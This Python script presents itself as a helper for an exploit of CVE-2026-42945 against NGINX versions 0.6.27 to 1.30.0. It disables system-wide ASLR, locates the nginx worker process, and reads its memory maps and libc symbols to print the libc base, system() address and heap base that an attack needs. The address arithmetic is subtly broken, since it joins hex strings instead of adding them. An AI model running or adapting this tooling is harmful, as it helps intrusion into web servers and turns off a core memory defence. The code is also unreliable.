# CVE-2026-42945
# This script is designed to determine HEAP_BASE, LIBC_BASE, and SYSTEM_ADDR,
# which are used in attacks against NGINX 0.6.27 - 1.30.0
# Tested on Debian 12
# author: @vomanc
import subprocess
import re


# Disable the ASLR
subprocess.check_output("echo 0 | tee /proc/sys/kernel/randomize_va_space", shell=True)
# Check the ASLR status
status_aslr = subprocess.check_output("cat /proc/sys/kernel/randomize_va_space", shell=True)
print("[*] ASLR status:", status_aslr.decode())

# search a process of worker
try:
    nginx_process = subprocess.check_output("pgrep -a nginx", shell=True)
except subprocess.CalledProcessError:
    subprocess.check_output("/usr/sbin/nginx", shell=False)
    print("[*] Run Nginx Server !...")
    nginx_process = subprocess.check_output("pgrep -a nginx", shell=True)
finally:
    nginx_worker_process = re.findall(rb'\d+', nginx_process)[-1].decode()
    print("[*] Nginx Worker Process", nginx_worker_process)

# Determine the LIBC_BASE address
list_libc_base_addr = subprocess.check_output(
    f"grep 'libc\.so' /proc/{nginx_worker_process}/maps", shell=True
    )
LIBC_BASE = re.search(rb'^([0-9a-f]+)-', list_libc_base_addr).group(1)
LIBC_BASE = f"0x{LIBC_BASE.decode()}"
print("LIBC BASE: ", LIBC_BASE)
# Determine the SYSTEM_ADDR
system_offset = subprocess.check_output(
    "readelf -sW /usr/lib/x86_64-linux-gnu/libc.so.6 | grep -E ' system(@|$)'",
    shell=True)
system_offset = re.search(rb':\s+0*([0-9a-f]+)\s', system_offset).group(1)
print("System Offset:", system_offset.decode())
SYSTEM_ADDR = LIBC_BASE + system_offset.decode()
# Determine the HEAP_BASE
HEAP_BASE = subprocess.check_output(f"grep '\[heap\]' /proc/{nginx_worker_process}/maps", shell=True)
HEAP_BASE = re.search(rb'^([0-9a-f]+)-', HEAP_BASE).group(1)
HEAP_BASE = f"0x{HEAP_BASE.decode()}"
print("HEAP BASE:", HEAP_BASE)
print(LIBC_BASE, SYSTEM_ADDR, HEAP_BASE)
